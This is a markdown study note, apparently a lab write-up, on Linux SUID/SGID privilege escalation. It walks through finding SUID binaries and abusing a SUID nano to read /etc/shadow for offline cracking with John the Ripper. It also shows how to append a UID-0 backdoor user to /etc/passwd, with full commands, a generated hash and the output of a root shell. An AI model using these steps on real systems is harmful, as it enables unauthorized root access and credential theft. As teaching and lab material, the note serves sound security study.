# SUID/SGID Privilege Escalation Notes

Many Linux privilege controls rely on controlling interactions between users and files through permissions. Files typically have read, write, and execute permissions assigned within a user's privilege level. This changes with **SUID** (Set-User Identification) and **SGID** (Set-Group Identification) bits.

- **SUID** allows a file to be executed with the permission level of the file **owner**.
- **SGID** allows a file to be executed with the permission level of the file's **group owner**.

Files with these bits set show an `s` in their permission string (e.g., `-rwsr-xr-x`), indicating the special permission level. This means the program runs with the effective UserID (or GroupID) of the binary's owner, rather than the user who invoked it.

## Table of Contents

- [Finding SUID/SGID Binaries](#finding-suidsgid-binaries)
- [Exploiting Nano with SUID](#exploiting-nano-with-suid)
- [Reading the /etc/shadow File](#reading-the-etcshadow-file)
- [Replacing the Root User](#replacing-the-root-user)
- [Summary](#summary)
- [References](#references)

---

## Finding SUID/SGID Binaries

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Example output:

```bash
john@suid-box:~$ find / -type f -perm -04000 -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Feb 15  2011 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517   12 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473326  188 -rwsr-xr-x   1 root     root       188328 Apr 15  2010 /bin/nano  (Note: this normally doesn't have SUID)
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs
```

A good practice is to compare listed executables against [GTFOBins](https://gtfobins.github.io/), which maintains a curated, filterable list of Unix binaries known to be exploitable when the SUID bit is set. A pre-filtered SUID list is available at [gtfobins.github.io/#+suid](https://gtfobins.github.io/#+suid).

> **Note:** Target systems may have additional SUID binaries beyond common/expected ones (like `nano`, which normally does not have SUID set). Always enumerate thoroughly rather than assuming.

---

## Exploiting Nano with SUID

If `nano` has the SUID bit set and is owned by `root`, it can be used to create, edit, and read files with root's privilege level. From here there are two common paths:

1. Reading `/etc/shadow` to crack password hashes offline.
2. Adding a new privileged user to `/etc/passwd`.

---

## Reading the /etc/shadow File

With SUID set on `nano`:

```bash
nano /etc/shadow
```

This prints the contents of `/etc/shadow`. Combined with `/etc/passwd`, the `unshadow` tool can generate a file crackable by John the Ripper:

```bash
unshadow passwd.txt shadow.txt > passwords.txt
```

```bash
john@suid-box:~$ unshadow passwd.txt shadow.txt > passwords.txt
Created directory /home/user/.john
```

With the correct wordlist, John the Ripper can potentially recover one or more passwords in cleartext.

---

## Replacing the Root User

An alternative to password cracking is adding a new user with root privileges directly to `/etc/passwd`.

### 1. Generate a password hash

```bash
openssl passwd -1 -salt THM password1
```

```bash
john@suid-box:~$ openssl passwd -1 -salt THM password1
$1$THM$WnbwlliCqxFRQepUTCkUT1
```

### 2. Add the user to /etc/passwd (via the SUID nano)

Append a line using UID/GID `0` and `/bin/bash` as the shell to grant a root shell:

```
hacker:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:/root:/bin/bash
```

### 3. Switch to the new user

```bash
john@suid-box:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
john@suid-box:~$ whoami
john
john@suid-box:~$ su hacker
Password:
root@suid-box:~# id
uid=0(root) gid=0(root) groups=0(root)
root@suid-box:~# whoami
root
```

---

## Summary

The SUID/SGID bit set on binaries like `nano` allows file operations to run with the file owner's privilege level. Checking discovered SUID/SGID binaries against GTFOBins is a fast way to identify a viable escalation path — often requiring an intermediate step (like editing `/etc/passwd` or reading `/etc/shadow`) rather than a direct shell.

## References

- [GTFOBins](https://gtfobins.github.io/) — a curated list of Unix binaries that can be exploited for privilege escalation.
